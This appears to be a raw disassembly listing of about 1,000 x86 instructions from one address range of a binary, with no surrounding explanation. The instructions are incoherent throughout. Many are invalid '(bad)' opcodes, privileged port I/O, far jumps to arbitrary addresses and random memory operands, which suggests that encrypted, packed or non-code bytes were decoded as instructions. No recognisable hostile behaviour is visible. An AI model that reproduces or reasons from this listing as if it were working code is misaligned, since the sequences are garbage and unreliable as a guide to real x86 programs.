  40ef1e:	call   FWORD PTR [esp+edi*4+0x4f]
  40ef22:	sub    BYTE PTR [ebp-0x63d676da],cl
  40ef28:	add    DWORD PTR [edx],edx
  40ef2a:	clc    
  40ef2b:	xchg   ebx,eax
  40ef2c:	(bad)  
  40ef2e:	int    0xe3
  40ef30:	xor    BYTE PTR [ebp-0x5f09b590],al
  40ef36:	aam    0x7
  40ef38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef39:	scas   eax,DWORD PTR es:[edi]
  40ef3a:	sbb    ecx,ebx
  40ef3c:	jbe    0x40ef00
  40ef3e:	mov    ecx,0x3237c71
  40ef43:	in     al,dx
  40ef44:	xor    ah,BYTE PTR [edx-0x33334730]
  40ef4a:	pop    ds
  40ef4b:	pop    esp
  40ef4c:	jp     0x40ef8f
  40ef4e:	xchg   esi,eax
  40ef4f:	and    edi,esp
  40ef51:	sub    al,0xc4
  40ef53:	cdq    
  40ef54:	jnp    0x40ef10
  40ef56:	mov    eax,ds:0x6b905d90
  40ef5b:	sbb    al,dl
  40ef5d:	loopne 0x40ef44
  40ef5f:	mov    bl,0x4
  40ef61:	(bad)  
  40ef62:	div    DWORD PTR [edi+0x115c4106]
  40ef68:	lock test dl,0x7b
  40ef6c:	daa    
  40ef6d:	retf   
  40ef6e:	les    ecx,FWORD PTR [edx+edi*2+0x359671fe]
  40ef75:	jle    0x40ef87
  40ef77:	jmp    0x811a:0x838610d7
  40ef7e:	setp   ch
  40ef81:	js     0x40ef5b
  40ef83:	sub    al,0xd
  40ef85:	xor    esi,DWORD PTR [ebx+ecx*4]
  40ef88:	aas    
  40ef89:	mov    ds:0x4469c9ea,al
  40ef8e:	push   ss
  40ef8f:	jl     0x40efdf
  40ef91:	pop    eax
  40ef92:	inc    edx
  40ef93:	add    DWORD PTR ds:0xedd4a40a,ebx
  40ef99:	(bad)
  40ef9d:	pop    es
  40ef9e:	push   esi
  40ef9f:	(bad)  
  40efa1:	xor    al,0x7e
  40efa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa4:	dec    ecx
  40efa5:	ins    DWORD PTR es:[edi],dx
  40efa6:	jmp    0x40ef56
  40efa8:	mov    eax,ds:0x976d564f
  40efad:	mov    esi,0xccef8a34
  40efb2:	mov    BYTE PTR [ecx+0x64fe2528],bh
  40efb8:	outs   dx,DWORD PTR ds:[esi]
  40efb9:	xor    BYTE PTR [edx+ecx*2-0x3],ah
  40efbd:	scas   al,BYTE PTR es:[edi]
  40efbe:	scas   al,BYTE PTR es:[edi]
  40efbf:	cs jg  0x40ef84
  40efc2:	adc    BYTE PTR [edi-0x4752ac4c],bh
  40efc8:	and    al,0xe2
  40efca:	mov    esp,0xd791491a
  40efcf:	dec    edx
  40efd0:	pop    esp
  40efd1:	and    al,0x7f
  40efd3:	sti    
  40efd4:	mov    al,ds:0x5c4a43d4
  40efd9:	adc    edi,ebp
  40efdb:	lods   eax,DWORD PTR ds:[esi]
  40efdc:	loope  0x40efe6
  40efde:	les    esp,FWORD PTR [edx-0x8f9e2f8]
  40efe4:	inc    edx
  40efe5:	xchg   edx,eax
  40efe6:	popa   
  40efe7:	or     eax,0x7ff2bf81
  40efec:	and    eax,0x42e6edc0
  40eff1:	xor    BYTE PTR [esi+0x77],bh
  40eff4:	adc    eax,0x93559f12
  40eff9:	push   ebx
  40effa:	inc    esi
  40effb:	scas   al,BYTE PTR es:[edi]
  40effc:	push   esp
  40effd:	and    BYTE PTR [eax+eax*1],ch
  40f000:	pop    ds
  40f001:	sbb    DWORD PTR [esi+edi*2+0x4cc59201],esp
  40f008:	rol    BYTE PTR [esi+eax*4+0x52],cl
  40f00c:	cs gs ja 0x40f021
  40f010:	js     0x40f084
  40f012:	xchg   DWORD PTR [ebp-0x6d9bf703],edi
  40f018:	mul    DWORD PTR [ecx]
  40f01a:	mov    ecx,edx
  40f01c:	dec    ebp
  40f01d:	lds    edx,FWORD PTR [edx]
  40f01f:	ss enter 0x4536,0x50
  40f024:	jge    0x40efac
  40f026:	pop    esi
  40f027:	enter  0x2e2f,0x7f
  40f02b:	pop    esi
  40f02c:	sub    BYTE PTR [ebx-0x70],0x82
  40f030:	mov    ds:0x8f316aad,al
  40f035:	leave  
  40f036:	pop    eax
  40f037:	fcomp  DWORD PTR [edx+0x39ef7c08]
  40f03d:	mov    bh,0x3d
  40f03f:	push   0x7f
  40f041:	inc    edx
  40f042:	(bad)  [edx]
  40f044:	push   esp
  40f045:	lahf   
  40f046:	gs fs push ss
  40f049:	ds cmp eax,0x11758fb9
  40f04f:	sub    eax,0x3a5d8e29
  40f054:	dec    ebx
  40f055:	lods   eax,DWORD PTR ds:[esi]
  40f056:	mov    ch,BYTE PTR [ecx-0x141290ce]
  40f05c:	sbb    DWORD PTR [edi],esp
  40f05e:	in     al,0xf3
  40f060:	mov    ebx,0x56cce107
  40f065:	xchg   ebp,esi
  40f067:	pop    edx
  40f068:	jne    0x40f0dc
  40f06a:	cmp    DWORD PTR [di+0x3b16],0x28
  40f070:	int    0x39
  40f072:	mov    al,BYTE PTR [ebx+0x201688c]
  40f078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f079:	(bad)  
  40f07a:	sbb    DWORD PTR [ebp-0x44c59b55],edi
  40f080:	(bad)  
  40f081:	mov    dh,0x29
  40f083:	loope  0x40f0f4
  40f085:	add    esp,DWORD PTR [esi]
  40f087:	xlat   BYTE PTR ds:[ebx]
  40f088:	push   ds
  40f089:	shl    BYTE PTR [edx+esi*8+0x7b980c85],0x8f
  40f091:	int3   
  40f092:	dec    ecx
  40f093:	mov    ch,0x63
  40f095:	adc    eax,0x1c93da38
  40f09a:	inc    edx
  40f09b:	(bad)  
  40f09d:	or     edi,DWORD PTR [edx+0x44]
  40f0a0:	retf   
  40f0a1:	cwde   
  40f0a2:	add    ch,cl
  40f0a4:	xchg   DWORD PTR [esi],ebx
  40f0a6:	mul    BYTE PTR [esp+eax*2]
  40f0a9:	in     eax,0x82
  40f0ab:	or     eax,0x1eb63b22
  40f0b0:	into   
  40f0b1:	outs   dx,BYTE PTR ds:[esi]
  40f0b2:	cwde   
  40f0b3:	les    ebp,FWORD PTR [esi+0x5d76a5be]
  40f0b9:	loop   0x40f0b8
  40f0bb:	pop    ds
  40f0bc:	ins    DWORD PTR es:[edi],dx
  40f0bd:	ins    DWORD PTR es:[edi],dx
  40f0be:	packuswb mm6,QWORD PTR [ebx-0x61]
  40f0c2:	mov    eax,ds:0x1587bb10
  40f0c7:	retf   0xc248
  40f0ca:	(bad)  
  40f0cb:	fdivrp st(6),st
  40f0cd:	iret   
  40f0ce:	fbld   TBYTE PTR [edx-0x7679312e]
  40f0d4:	fsub   DWORD PTR [esi]
  40f0d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d7:	out    dx,eax
  40f0d8:	jp     0x40f131
  40f0da:	cld    
  40f0db:	sti    
  40f0dc:	leave  
  40f0dd:	mov    eax,ds:0x1ac0758c
  40f0e2:	inc    esi
  40f0e3:	push   esi
  40f0e4:	inc    ecx
  40f0e5:	test   al,0x22
  40f0e7:	add    BYTE PTR [esi+eiz*1-0x7b46fd1f],al
  40f0ee:	in     eax,0xc0
  40f0f0:	test   eax,0x31fdcc37
  40f0f5:	icebp  
  40f0f6:	adc    dl,BYTE PTR [ebx]
  40f0f8:	clc    
  40f0f9:	call   0xc35c:0x7f5ca3f2
  40f100:	mov    eax,0xeed10940
  40f105:	pop    ebp
  40f106:	sbb    DWORD PTR [ebx+ecx*4],ecx
  40f109:	dec    esi
  40f10a:	out    dx,al
  40f10b:	loope  0x40f097
  40f10d:	dec    ebp
  40f10e:	jo     0x40f139
  40f110:	push   edi
  40f111:	scas   al,BYTE PTR es:[edi]
  40f112:	mov    edi,0x55d53da3
  40f117:	push   ds
  40f118:	jno    0x40f167
  40f11a:	popf   
  40f11b:	fwait
  40f11c:	ret    
  40f11d:	jnp    0x40f18a
  40f11f:	nop
  40f120:	cdq    
  40f121:	push   ss
  40f122:	or     ebp,DWORD PTR [eax+eiz*8]
  40f125:	scas   al,BYTE PTR es:[edi]
  40f126:	pushf  
  40f127:	pop    DWORD PTR [eax]
  40f129:	popa   
  40f12a:	lock mov dl,0x11
  40f12d:	(bad)  
  40f12e:	pop    esi
  40f12f:	xchg   DWORD PTR [eax],eax
  40f131:	dec    esp
  40f132:	arpl   WORD PTR [ebp+edi*8+0x15],dx
  40f136:	stos   DWORD PTR es:[edi],eax
  40f137:	and    bh,BYTE PTR [edx+ebx*8-0x7aac1c10]
  40f13e:	and    dl,dl
  40f140:	add    eax,0x4d52d1ed
  40f145:	outs   dx,DWORD PTR ds:[esi]
  40f146:	xchg   DWORD PTR [eax+0x39],ecx
  40f149:	test   al,0xdb
  40f14b:	mov    DWORD PTR [edi],eax
  40f14d:	xchg   esi,eax
  40f14e:	jp     0x40f16e
  40f150:	int    0xe2
  40f152:	clc    
  40f153:	sub    edi,DWORD PTR [edx]
  40f155:	inc    edx
  40f156:	es push es
  40f158:	cmp    ebp,DWORD PTR [eax-0x356885b1]
  40f15e:	add    DWORD PTR [edi],ebx
  40f160:	addr16 mov ds:0xc816,eax
  40f164:	(bad)
  40f168:	xchg   BYTE PTR [ecx-0x70],ah
  40f16b:	icebp  
  40f16c:	and    DWORD PTR [edx+0x6fea892c],0x52
  40f173:	xchg   ecx,eax
  40f174:	or     BYTE PTR [ecx-0x34e0101d],dh
  40f17a:	out    0x1f,eax
  40f17c:	lods   eax,DWORD PTR ds:[esi]
  40f17d:	arpl   di,cx
  40f17f:	adc    DWORD PTR [edx+0x272b2d54],eax
  40f185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f186:	or     eax,0xee010316
  40f18b:	je     0x40f1d5
  40f18d:	inc    edi
  40f18e:	jbe    0x40f1ef
  40f190:	mov    bh,0x2f
  40f192:	minps  xmm6,XMMWORD PTR [edi-0x19e1b9f2]
  40f199:	xor    DWORD PTR [ebx-0x621554b],0xffffffdc
  40f1a0:	(bad)  
  40f1a1:	mov    eax,0xe8909e68
  40f1a6:	addr16 jmp 0x1df082f8
  40f1ac:	dec    ecx
  40f1ad:	lds    edi,FWORD PTR [ebx]
  40f1af:	mov    bl,0x30
  40f1b1:	mov    bh,bh
  40f1b3:	cmp    bl,BYTE PTR [ecx]
  40f1b5:	inc    ecx
  40f1b6:	into   
  40f1b7:	outs   dx,BYTE PTR ds:[esi]
  40f1b8:	fisttp WORD PTR [ebp+0x13]
  40f1bb:	mov    eax,0x15626256
  40f1c0:	xor    eax,0xe01d5595
  40f1c5:	push   ds
  40f1c6:	imul   ebx,DWORD PTR [esi+esi*2+0x2064a230],0xf7da44a1
  40f1d1:	mov    esi,0xef37ed17
  40f1d6:	push   ebx
  40f1d7:	loop   0x40f217
  40f1d9:	cmp    BYTE PTR [eax-0x6ece94b],ah
  40f1df:	jno    0x40f199
  40f1e1:	fbstp  TBYTE PTR [edx-0x5afa6c9f]
  40f1e7:	xor    eax,0x516482dd
  40f1ec:	add    BYTE PTR [eax+edi*8],dl
  40f1ef:	jno    0x40f1f1
  40f1f1:	mov    edx,0x199b9b65
  40f1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f7:	pop    ebx
  40f1f8:	imul   ecx,DWORD PTR [esi+eiz*2+0x45],0xffffffae
  40f1fd:	dec    ah
  40f1ff:	fstp   TBYTE PTR ds:0x35249b6b
  40f205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f206:	sti    
  40f207:	dec    ebx
  40f208:	loop   0x40f224
  40f20a:	scas   eax,DWORD PTR es:[edi]
  40f20b:	jecxz  0x40f205
  40f20d:	fwait
  40f20e:	repnz adc edx,DWORD PTR [edi]
  40f211:	outs   dx,BYTE PTR ds:[esi]
  40f212:	(bad)  
  40f213:	xchg   edx,eax
  40f214:	fwait
  40f215:	test   eax,0x17cc4c93
  40f21a:	and    eax,0xc4b2bb97
  40f21f:	and    ebx,DWORD PTR [edx]
  40f221:	loope  0x40f270
  40f223:	mov    dh,bh
  40f225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f226:	into   
  40f227:	pushf  
  40f228:	je     0x40f216
  40f22a:	dec    ecx
  40f22b:	stc    
  40f22c:	jle    0x40f22d
  40f22e:	jno    0x40f246
  40f230:	xor    eax,0xb2c0322b
  40f235:	sub    eax,0xea8edb40
  40f23a:	pop    edx
  40f23b:	cmp    edi,DWORD PTR [ebx]
  40f23d:	scas   eax,DWORD PTR es:[edi]
  40f23e:	mov    ebx,0xea34fccc
  40f243:	push   edi
  40f244:	push   ds
  40f245:	into   
  40f246:	ror    BYTE PTR [esi-0x750d79a2],cl
  40f24c:	fisubr DWORD PTR [ebx]
  40f24e:	out    dx,eax
  40f24f:	fisub  WORD PTR [eax-0x69d21779]
  40f255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f256:	pop    ebx
  40f257:	outs   dx,DWORD PTR ds:[esi]
  40f258:	xchg   esp,eax
  40f259:	clc    
  40f25a:	adc    ecx,DWORD PTR [ebx]
  40f25c:	push   eax
  40f25d:	adc    BYTE PTR [esi+0x2d],0x64
  40f261:	add    BYTE PTR [ecx+0x5e],0x8a
  40f265:	test   al,0x4d
  40f267:	fwait
  40f268:	stc    
  40f269:	sub    DWORD PTR [ebp+0x7a],0x8
  40f26d:	mov    edx,0x85377b73
  40f272:	call   0xdf63b7df
  40f277:	push   DWORD PTR [ebx+0x589f4a5f]
  40f27d:	ficomp DWORD PTR [ecx-0x2a5688a6]
  40f283:	add    edi,eax
  40f285:	je     0x40f250
  40f287:	clc    
  40f288:	xor    BYTE PTR [ebx],bl
  40f28a:	sub    BYTE PTR [ebp-0x3f],bh
  40f28d:	add    dl,BYTE PTR ds:0x63aa0935
  40f293:	cmc    
  40f294:	out    0x2d,al
  40f296:	adc    BYTE PTR [eax-0x6adfbda0],0xb4
  40f29d:	ds jno 0x40f2d7
  40f2a0:	iret   
  40f2a1:	push   edi
  40f2a2:	pop    esp
  40f2a3:	pop    edi
  40f2a4:	int    0x18
  40f2a6:	sub    eax,0x2a5e2334
  40f2ab:	dec    eax
  40f2ac:	push   ebp
  40f2ad:	loope  0x40f2b0
  40f2af:	cmc    
  40f2b0:	ja     0x40f234
  40f2b2:	scas   eax,DWORD PTR es:[edi]
  40f2b3:	loope  0x40f305
  40f2b5:	ds mov eax,0xfd04688d
  40f2bb:	mov    edi,0x8483d2e0
  40f2c0:	test   al,0xaa
  40f2c2:	mov    ds:0xe4aeec05,al
  40f2c7:	jp     0x40f2d8
  40f2c9:	and    esi,edx
  40f2cb:	retf   0xa65
  40f2ce:	sbb    al,0xd0
  40f2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d1:	test   DWORD PTR [ebx],ebp
  40f2d3:	mov    ecx,0x7d6ba308
  40f2d8:	call   DWORD PTR [edi-0x8b7ba90]
  40f2de:	and    eax,0x23eb5404
  40f2e3:	bound  eax,QWORD PTR [edi+edi*4]
  40f2e6:	cli    
  40f2e7:	repz out dx,al
  40f2e9:	lock sub dh,al
  40f2ec:	into   
  40f2ed:	and    eax,0xce03c720
  40f2f2:	stc    
  40f2f3:	fist   WORD PTR [ebx+0x3e59243]
  40f2f9:	scas   eax,DWORD PTR es:[edi]
  40f2fa:	push   edx
  40f2fb:	adc    BYTE PTR [ebx],bh
  40f2fd:	and    al,0x98
  40f2ff:	xor    al,0xe8
  40f301:	div    BYTE PTR [edx]
  40f303:	outs   dx,DWORD PTR ds:[esi]
  40f304:	pop    esp
  40f305:	cmc    
  40f306:	sbb    DWORD PTR [ecx],0x36030235
  40f30c:	(bad)  
  40f30d:	cmp    eax,DWORD PTR [esi-0x5e76cbf0]
  40f313:	pop    ds
  40f314:	loope  0x40f299
  40f316:	xor    al,0xa9
  40f318:	cmp    DWORD PTR [ecx],esp
  40f31a:	dec    eax
  40f31b:	mov    ebx,0x7865fd02
  40f320:	xchg   DWORD PTR [ebx],edx
  40f322:	cmc    
  40f323:	adc    BYTE PTR [eax+0x1a03e895],ah
  40f329:	xor    BYTE PTR [eax+0x6fde47e8],ch
  40f32f:	lock daa 
  40f331:	add    DWORD PTR [esi+0x1a],ebx
  40f334:	cmp    cl,dl
  40f336:	mov    ah,0x51
  40f338:	mul    BYTE PTR [ebp+0x5c3ce0a4]
  40f33e:	mov    cl,0xaa
  40f340:	mov    gs,WORD PTR [ebp-0x632a078d]
  40f346:	test   al,0xfa
  40f348:	and    dh,bl
  40f34a:	or     DWORD PTR [esp+edx*8+0x3daff795],eax
  40f351:	mov    ch,0xba
  40f353:	jae    0x40f37e
  40f355:	mov    al,0xa9
  40f357:	addr16 in eax,0xae
  40f35a:	add    cl,BYTE PTR [esi]
  40f35c:	stos   DWORD PTR es:[edi],eax
  40f35d:	outs   dx,BYTE PTR ds:[esi]
  40f35e:	mov    eax,0x98e1749e
  40f363:	daa    
  40f364:	jb     0x40f331
  40f366:	push   ebp
  40f367:	jge    0x40f37f
  40f369:	aaa    
  40f36a:	jmp    0x70ad49c3
  40f36f:	jnp    0x40f337
  40f371:	cwde   
  40f372:	mov    cl,0x40
  40f374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f375:	mov    bl,0x48
  40f377:	pop    ecx
  40f378:	or     eax,0xc75a2aa
  40f37d:	out    0x61,al
  40f37f:	cmp    BYTE PTR [edx],bh
  40f381:	fs sbb eax,0x7a20ca9a
  40f387:	mov    dh,0x7e
  40f389:	mov    ds:0x68572a48,eax
  40f38e:	in     eax,dx
  40f38f:	add    BYTE PTR [edx+0x5f],dl
  40f392:	sub    al,0x1b
  40f394:	cmp    eax,DWORD PTR [ecx-0x33]
  40f397:	sub    DWORD PTR [ebp-0x36840216],0xffffffbb
  40f39e:	push   ebp
  40f39f:	imul   ebx,DWORD PTR [ecx-0x7b],0x56
  40f3a3:	push   0xffffffee
  40f3a5:	xchg   ebp,eax
  40f3a6:	xor    DWORD PTR [ecx-0x7e],ebp
  40f3a9:	imul   edx,DWORD PTR [edi+0x3dfdac50],0xf34e9b42
  40f3b3:	popf   
  40f3b4:	cmp    eax,0xe2dddf80
  40f3b9:	dec    edi
  40f3ba:	ss mov eax,0xdf30198e
  40f3c0:	mov    bl,0x65
  40f3c2:	jae    0x40f412
  40f3c4:	pop    gs
  40f3c6:	shl    BYTE PTR [ebx-0x1f3abe93],1
  40f3cc:	add    al,0xb8
  40f3ce:	dec    ebp
  40f3cf:	xor    DWORD PTR [ecx-0x449572c],edx
  40f3d5:	add    DWORD PTR [edx],0xa337fe7e
  40f3db:	push   ecx
  40f3dc:	xchg   esi,eax
  40f3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3de:	aas    
  40f3df:	inc    ecx
  40f3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3e1:	jbe    0x40f384
  40f3e3:	push   edx
  40f3e4:	(bad)  
  40f3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3e6:	xchg   ebx,eax
  40f3e7:	mov    BYTE PTR [eax+esi*4+0x6a],cl
  40f3eb:	lods   al,BYTE PTR ds:[esi]
  40f3ec:	dec    esp
  40f3ed:	jl     0x40f3c6
  40f3ef:	es cwde 
  40f3f1:	cmp    dl,BYTE PTR [ebp-0x119efb0e]
  40f3f7:	jl     0x40f3f7
  40f3f9:	frstor [eax+0x4efea5f3]
  40f3ff:	les    edx,FWORD PTR [esi]
  40f401:	mov    ch,0xda
  40f403:	lock out dx,al
  40f405:	cli    
  40f406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f407:	mov    edx,0xec7e1bce
  40f40c:	rol    DWORD PTR [edx-0x68],cl
  40f40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f410:	add    dl,BYTE PTR [ebp+0x44353ade]
  40f416:	test   BYTE PTR [esi+eiz*1-0x9d1ab6],cl
  40f41d:	(bad)  
  40f41e:	cmc    
  40f41f:	test   DWORD PTR [eax+0x3b05b7ff],edx
  40f425:	mov    WORD PTR [ebp-0x28],fs
  40f428:	hlt    
  40f429:	outs   dx,DWORD PTR ds:[esi]
  40f42a:	retf   0x89ab
  40f42d:	(bad)  
  40f42e:	push   ecx
  40f42f:	jns    0x40f3d1
  40f431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f432:	pop    edx
  40f433:	stos   BYTE PTR es:[edi],al
  40f434:	les    ebp,FWORD PTR [ecx+0x5a]
  40f437:	hlt    
  40f438:	iret   
  40f439:	cmp    al,0xdb
  40f43b:	aas    
  40f43c:	mov    ?,WORD PTR [eax+0x2be3d487]
  40f442:	mov    edi,es
  40f444:	fwait
  40f445:	push   eax
  40f446:	dec    edi
  40f447:	sti    
  40f448:	pop    ebx
  40f449:	mov    DWORD PTR [ecx],0x98a2f854
  40f44f:	add    ebp,DWORD PTR [esi-0x5a046157]
  40f455:	popa   
  40f456:	xchg   ebx,eax
  40f457:	add    BYTE PTR [edx],bl
  40f459:	(bad)  
  40f45a:	pop    ebx
  40f45b:	sub    al,0x20
  40f45d:	test   BYTE PTR [eax-0x1],dh
  40f460:	in     al,0x15
  40f462:	jo     0x40f49e
  40f464:	mov    ds:0x7738bcbf,eax
  40f469:	test   ecx,ecx
  40f46b:	xlat   BYTE PTR ds:[ebx]
  40f46c:	cmp    eax,0xbff473de
  40f471:	lods   al,BYTE PTR ds:[esi]
  40f472:	xchg   ecx,eax
  40f473:	test   DWORD PTR [ecx+0x45eaab47],ebx
  40f479:	clc    
  40f47a:	dec    esi
  40f47b:	push   ecx
  40f47c:	dec    esi
  40f47d:	mov    ?,WORD PTR [edx]
  40f47f:	pop    ebp
  40f480:	inc    edi
  40f481:	xchg   ecx,eax
  40f482:	xchg   esp,eax
  40f483:	(bad)  
  40f484:	jne    0x40f4c8
  40f486:	jecxz  0x40f4d9
  40f488:	jo     0x40f47c
  40f48a:	ds leave 
  40f48c:	je     0x40f44e
  40f48e:	jp     0x40f430
  40f490:	mov    eax,ds:0x5d7bee67
  40f495:	add    al,0xb5
  40f497:	inc    eax
  40f498:	mov    ebx,0x29dda2ed
  40f49d:	sahf   
  40f49e:	jbe    0x40f4f2
  40f4a0:	jno    0x40f507
  40f4a2:	or     cl,BYTE PTR ds:0xce6175bd
  40f4a8:	cmp    BYTE PTR [ebp-0x77],ch
  40f4ab:	jp     0x40f4d4
  40f4ad:	imul   ebp,DWORD PTR [ecx+0x4a53075],0x35
  40f4b4:	jmp    0x40f527
  40f4b6:	mov    WORD PTR [edi+0x72b805d],ss
  40f4bc:	fidivr DWORD PTR [ecx+0x3c7b4c91]
  40f4c2:	test   eax,0x29f70d16
  40f4c7:	sbb    ah,BYTE PTR [esi-0x43]
  40f4ca:	mov    BYTE PTR [esi+0xe],al
  40f4cd:	xor    eax,0xab3e740b
  40f4d2:	imul   esi,DWORD PTR [ebx-0x7c9ebe9],0x83e50406
  40f4dc:	jl     0x40f4d3
  40f4de:	(bad)  
  40f4e0:	pushf  
  40f4e1:	in     al,dx
  40f4e2:	add    DWORD PTR [ebp+0x48af141c],ecx
  40f4e8:	mov    al,cl
  40f4ea:	je     0x40f4d8
  40f4ec:	ret    
  40f4ed:	or     al,0x32
  40f4ef:	sbb    al,0x14
  40f4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f2:	fstp   DWORD PTR [eax]
  40f4f4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f6:	mov    cl,0xca
  40f4f8:	push   edx
  40f4f9:	scas   ax,WORD PTR es:[edi]
  40f4fb:	cwde   
  40f4fc:	dec    ecx
  40f4fd:	adc    BYTE PTR [edi],0x30
  40f500:	lds    edi,FWORD PTR [esi+0x5c]
  40f503:	loopne 0x40f49b
  40f505:	xor    esi,DWORD PTR [edi]
  40f507:	fisub  WORD PTR [eax+ebx*2-0x2c6663ab]
  40f50e:	out    dx,al
  40f50f:	in     eax,0xc6
  40f511:	or     eax,0x84eba676
  40f516:	ror    BYTE PTR [esi-0x65ec6aa1],0x9f
  40f51d:	jne    0x40f512
  40f51f:	xchg   esp,eax
  40f520:	or     BYTE PTR [ebx+0x5f41ceb2],bl
  40f526:	sbb    DWORD PTR [ecx],ebp
  40f528:	imul   esp,DWORD PTR [ebp-0x15c789c8],0x1d528130
  40f532:	jns    0x40f4ee
  40f534:	mov    eax,ds:0xbbad874d
  40f539:	pop    esi
  40f53a:	call   0x98ad:0x66224dfa
  40f541:	adc    eax,0xdc576c4b
  40f546:	enter  0x723c,0xac
  40f54a:	in     eax,0xd9
  40f54c:	mov    eax,eax
  40f54e:	fs je  0x40f552
  40f551:	and    al,0xee
  40f553:	repnz push eax
  40f555:	mov    edx,gs
  40f557:	out    dx,al
  40f558:	mov    ch,0xce
  40f55a:	(bad)  
  40f55b:	in     eax,dx
  40f55c:	lea    esi,[ecx]
  40f55e:	add    ebp,DWORD PTR [eax+0x72d4ba20]
  40f564:	ss loopne 0x40f54c
  40f567:	inc    eax
  40f568:	fistp  QWORD PTR [esp+edx*2+0x4a7f0f49]
  40f56f:	push   ds
  40f570:	adc    DWORD PTR [ebp+0x5],edx
  40f573:	icebp  
  40f574:	repz xor BYTE PTR [ecx-0x5f168a0a],0x2f
  40f57c:	sbb    al,0x9
  40f57e:	mov    ebx,eax
  40f580:	ins    DWORD PTR es:[edi],dx
  40f581:	out    dx,eax
  40f582:	pop    ebx
  40f583:	bound  esp,QWORD PTR [ecx+0x3e]
  40f586:	push   cs
  40f587:	imul   ebp,DWORD PTR [ecx-0x383f409b],0xffffff84
  40f58e:	pop    esp
  40f58f:	push   ecx
  40f590:	and    al,0xc9
  40f592:	rcr    BYTE PTR [eax],0x38
  40f595:	stc    
  40f596:	(bad)  
  40f597:	shr    DWORD PTR [esi],1
  40f599:	iret   
  40f59a:	loopne 0x40f5b8
  40f59c:	test   BYTE PTR [esi-0x85c7a7b],dh
  40f5a2:	imul   ebp,esi,0x7e
  40f5a5:	(bad)  
  40f5a6:	sar    BYTE PTR ds:0x9338bf3e,cl
  40f5ac:	loopne 0x40f5f6
  40f5ae:	ss pop ecx
  40f5b0:	cmp    eax,0x16045c32
  40f5b5:	sub    al,0x18
  40f5b7:	aad    0x49
  40f5b9:	xlat   BYTE PTR ds:[ebx]
  40f5ba:	dec    edi
  40f5bb:	mov    ebp,0x70e4815b
  40f5c0:	sbb    ebp,DWORD PTR [ebx-0x22375e5b]
  40f5c6:	xchg   esi,eax
  40f5c7:	das    
  40f5c8:	je     0x40f56d
  40f5ca:	add    al,0xab
  40f5cc:	mov    eax,0xbe9e704a
  40f5d1:	jp     0x40f5c7
  40f5d3:	pop    eax
  40f5d4:	push   edi
  40f5d5:	xor    bl,BYTE PTR [eax]
  40f5d7:	add    BYTE PTR [esi-0x5b],bh
  40f5da:	adc    DWORD PTR [ebp-0x79],0x632928a4
  40f5e1:	cmp    BYTE PTR [ecx-0x43688686],cl
  40f5e7:	out    0x9b,al
  40f5e9:	push   ds
  40f5ea:	in     al,dx
  40f5eb:	pop    ebx
  40f5ec:	push   0x2f5578d4
  40f5f1:	test   eax,0xaf3db997
  40f5f6:	sti    
  40f5f7:	sub    BYTE PTR [eax+0x34fd14ff],bh
  40f5fd:	mov    ch,BYTE PTR [eax-0x10725e3a]
  40f603:	push   esp
  40f604:	pop    eax
  40f605:	clc    
  40f606:	std    
  40f607:	dec    ecx
  40f608:	fwait
  40f609:	xchg   edx,eax
  40f60a:	xor    DWORD PTR [ecx+0x1ef63b00],eax
  40f610:	aaa    
  40f611:	cmp    eax,0x3f5985f7
  40f616:	dec    esp
  40f617:	inc    eax
  40f618:	push   0x348c605
  40f61d:	pop    eax
  40f61e:	arpl   WORD PTR [edi+0x40],ax
  40f621:	mov    esi,0xd880360c
  40f626:	inc    ebx
  40f627:	in     eax,0xf7
  40f629:	aad    0xd1
  40f62b:	pop    ebx
  40f62c:	xor    bh,ch
  40f62e:	outs   dx,DWORD PTR ds:[esi]
  40f62f:	(bad)  
  40f630:	adc    BYTE PTR [edi+0x10],dh
  40f633:	dec    eax
  40f634:	out    0xa2,al
  40f636:	and    ch,BYTE PTR [edi-0x3abeba5]
  40f63c:	iret   
  40f63d:	or     BYTE PTR [ecx+0x15],ch
  40f640:	mov    al,ds:0x29fb36f2
  40f645:	pop    ebp
  40f646:	call   0xfff02c62
  40f64b:	adc    al,0x11
  40f64d:	rcl    DWORD PTR [ebx],cl
  40f64f:	int    0x73
  40f651:	dec    ebx
  40f652:	retf   0x8b8d
  40f655:	cdq    
  40f656:	push   0x7ef99f0f
  40f65b:	sub    al,0x4e
  40f65d:	aaa    
  40f65e:	adc    bl,bl
  40f660:	in     eax,dx
  40f661:	mov    ebx,0x253f1e77
  40f666:	xchg   esi,eax
  40f667:	add    edx,DWORD PTR [edi-0x589983bf]
  40f66d:	or     bh,BYTE PTR [ebx-0x758e6e57]
  40f673:	inc    ebp
  40f674:	test   eax,0x8e888281
  40f679:	push   esp
  40f67a:	jbe    0x40f6cd
  40f67c:	hlt    
  40f67d:	and    al,0xed
  40f67f:	pushf  
  40f680:	sub    ecx,ebp
  40f682:	add    DWORD PTR [ebx-0xcea7dab],edx
  40f688:	js     0x40f669
  40f68a:	xchg   ebp,eax
  40f68b:	and    bl,cl
  40f68d:	loop   0x40f6b0
  40f68f:	xchg   edx,eax
  40f690:	popa   
  40f691:	arpl   cx,bp
  40f693:	ret    
  40f694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f695:	loope  0x40f68c
  40f697:	dec    edx
  40f698:	xor    bh,BYTE PTR [esi]
  40f69a:	out    dx,al
